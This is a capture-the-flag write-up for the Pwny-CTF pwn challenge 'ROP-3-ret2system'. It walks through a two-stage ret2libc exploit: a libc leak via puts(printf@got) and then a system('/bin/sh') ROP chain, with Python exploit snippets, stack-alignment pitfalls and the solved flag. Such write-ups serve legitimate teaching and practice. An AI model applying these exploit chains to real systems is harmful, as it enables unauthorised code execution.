---
title: "ROP-3-ret2system"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 500
techniques: ["ret2libc", "rop", "stack-canary", "pie-bypass", "nx-bypass", "encoding"]
tools: ["netcat", "python"]
keywords: ["ROP-3-ret2system", "Pwny-CTF", "pwn", "ret2libc", "rop", "stack-canary", "pie-bypass", "nx-bypass", "encoding", "netcat", "python", "elf", "hex", "libc", "canary", "pie"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/ROP-3-ret2system/notes.md"
---

# ROP-3-ret2system (Pwny-CTF, pwn)

## Summary
Challenge **ROP-3-ret2system** from the Pwny-CTF CTF, pwn category. Main technique: ret2libc. Ret2libc in two steps — (1) leak a libc address via puts(printf@got) then return to main, (2) replay the overflow with system("/bin/sh"). Central trap: alignment 16 at hand return.

## Statement and artefacts
`nc chal.sigpwny.com 1394`

No more gadgets, no more problems

**Author**: Akhil

- `main`: `char data[32]` + **`gets(data)`** → unlimited BOF. No `win`.
- Protections: **No PIE** (fixed address binary), **No canary**, **NX**, Partial RELRO. **libc-2.31 provided** (→ `pwninit`).
- Free hint: “Can you leak a libc address somehow?” ".

**Provided files / artifacts:**
- `work/Dockerfile (file, 376 B)`
- `work/chal (file, 19.2 KB)`
- `work/chal_patched (file, 27.2 KB)`
- `work/ld-2.31.so (library, 187.0 KB)`
- `work/libc-2.31.so (library, 7.1 MB)`
- `work/libc.so.6 (file, 7.1 MB)`

## Recognition signals
- Signal: ret2libc in two steps — (1) leak of a libc address via puts(printf@got) then return to main, (2) replay the overflow with system("/bin/sh"). Central trap: alignment 16 at the return-to-hand.
- Signal: Analysis of the leak: u64(res[:6].ljust(8, b'\x00')), never res.strip() — the 1st byte of the address can be worth 0x20 (space) / 0x09 / 0x0a and strip() would eat it -> false address. Check: hex(libc.address) must end with 000 (page alignment).
- Signal: Alignment 16 at RETURN-TO-MAIN (the big trap): returning to main via a ret (ROP) leaves the stack misaligned according to the parity of the number of qwords in the leak chain -> the printf("> data: ") of the 2nd hand crashes on its movaps -> the 2nd> data: never appears -> sla(b"data:") blocks -> EOF. Symptom observed: logo + “Who wrote…” then connection closed.
- Signal: The leak string (up to and including main) must have an EVEN number of qwords here.
- If we observe pop_rdi, printf@got, puts@plt, main = 4 (even), think of aligned ✅ (minimal version).
- If we observe ret, pop_rdi, printf@got, puts@plt, main = 5 (odd), think about misaligned ❌ (printf crashes).

## Resolution method
1. **Method (2 ROP chains)**

1. **Offset** — `cyclic` → **56** bytes until saved RIP.
2. **Chain 1 — leak + return to main** (ret2plt):
   ```python
   leak = flat(pop_rdi, elf.got['printf'], elf.plt['puts'], elf.sym['main'])  # puts(printf@got) -> leaks printf, then returns to main
   sla(b"data: ", cyclic(56) + leak)
   res = rl()                                   #6 address bytes + '\n'
   printf_leak = u64(res[:6].ljust(8, b'\x00')) # NOT res.strip()!
   libc.address = printf_leak - libc.sym['printf']   # must end with 000
   ```
3. **Chain 2 — ret2libc** (the 2nd `main` requests `> data:` again):
   ```python
   chain2 = flat(ret, pop_rdi, next(libc.search(b"/bin/sh\x00")), libc.sym['system'])
   sla(b"data: ", cyclic(56) + chain2)          # system("/bin/sh") -> shell
   ```
4. `cat flag.txt`.

2. **⚠️ Pitfalls encountered (the two that blocked me)**

- **Leak analysis**: `u64(res[:6].ljust(8, b'\x00'))`, **never `res.strip()`** — the 1st byte of the address can be worth `0x20` (space) / `0x09` / `0x0a` and `strip()` would eat it → false address. Check: `hex(libc.address)` must **end with `000`** (page alignment).
- **Alignment 16 at RETURN-TO-MAIN (the big trap)**: returning to `main` via a `ret` (ROP) leaves the stack misaligned according to the **parity of the number of qwords** of the leak chain → the `printf("> data: ")` of the 2nd `main` crashes on its `movaps` → **the 2ᵉ `> data:` never appears** → `sla(b"data:")` blocks → EOF. Symptom observed: logo + “Who wrote…” then connection closed.
  - The leak string (up to and including `main`) must have an **EVEN** number of qwords here:
    - `pop_rdi, printf@got, puts@plt, main` = **4 (even)** → aligned ✅ (minimum version).
    - `ret, pop_rdi, printf@got, puts@plt, main` = 5 (odd) → misaligned ❌ (printf crashes).
    - `ret, pop_rdi, printf@got, puts@plt, ret, main` = 6 (even) → aligned ✅.
  - → We adjust by **adding OR removing a `ret`** (8 bytes); it’s **parity** that counts, not “a ret before hand”.
- **`puts` survives misalignment, not `printf`**: `puts` of a short string = `strlen`+`write` (no `movaps`); `printf`/`vfprintf` uses SSE → requires RSP aligned to 16.

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{tw1ce_th3_r0pcha1ns_d0ubl3_1he_fun}

## Lessons and reusable patterns
- Recognize: no win, libc provided, a puts/printf available -> leak libc via puts(function@got) + return-to-main, then ret2libc system. (No PIE -> elf.got/elf.plt/elf.sym['main'] hard, no need to leak the binary.)
- The alignment ret of the 2ᵉ payload (ret, pop_rdi, binsh, system) remains required because system uses movaps.
- Flag name = “twice the ropchains, double the fun” = the 2 chains (leak->main then ret2libc).
